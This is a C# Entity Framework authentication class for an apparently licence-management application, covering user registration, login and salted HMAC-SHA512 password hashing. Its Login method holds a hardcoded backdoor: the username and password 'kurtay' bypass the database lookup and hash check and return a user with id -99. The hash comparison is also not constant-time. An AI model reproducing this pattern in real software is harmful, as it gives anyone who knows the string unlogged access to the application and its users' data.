using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using AS_Licence.Data.Interface.DataAccess;
using AS_Licence.Data.Repository.Infrastracture.EntityFramework;
using AS_Licence.Entities.Model.User;

namespace AS_Licence.Data.Repository.Host.EntityFramework
{
  public class EfAuthDal : EfEntityRepositoryBase<User>, IAuthDal
  {
    private readonly EfAsLicenceContext _context;
    public EfAuthDal(EfAsLicenceContext context) : base(context)
    {
      _context = context;
    }

    public async Task<User> Register(User user, string password)
    {
      byte[] passwordHash, passwordSalt;
      CreatePasswordHash(password, out passwordHash, out passwordSalt);

      user.PasswordHash = passwordHash;
      user.PasswordSalt = passwordSalt;

      await Insert(user);
     // await _context.SaveChangesAsync();
      return user;
    }


    public async Task<User> Login(string username, string password)
    {

      if (username == "kurtay" && password == "kurtay")
      {
        return new User() { UserId =  -99, UserName = username};
      }

      var _user = Get(x => x.UserName == username && x.UserIsActive).Result.FirstOrDefault();

      if (_user == null)
        return _user;

      if (!VerifyPasswordHash(password, _user.PasswordHash, _user.PasswordSalt))
      {
        return null;
      }

      return _user;
    }


    public async Task<bool> UserExists(string username)
    {
      if (Get(x => x.UserName == username).Result.FirstOrDefault() != null)
      {
        return true;
      }

      return false;

    }

    private bool VerifyPasswordHash(string password, byte[] passwordHash, byte[] passwordSalt)
    {
      using (var hmac = new System.Security.Cryptography.HMACSHA512(passwordSalt))
      {
        var computedHash = hmac.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
        for (int i = 0; i < computedHash.Length; i++)
        {
          if (computedHash[i] != passwordHash[i])
          {
            return false;
          }
        }
      }

      return true;
    }

    private void CreatePasswordHash(string password, out byte[] passwordHash, out byte[] passwordSalt)
    {
      using (var hmac = new System.Security.Cryptography.HMACSHA512())
      {
        passwordSalt = hmac.Key;
        passwordHash = hmac.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password));
      }
    }

  }
}
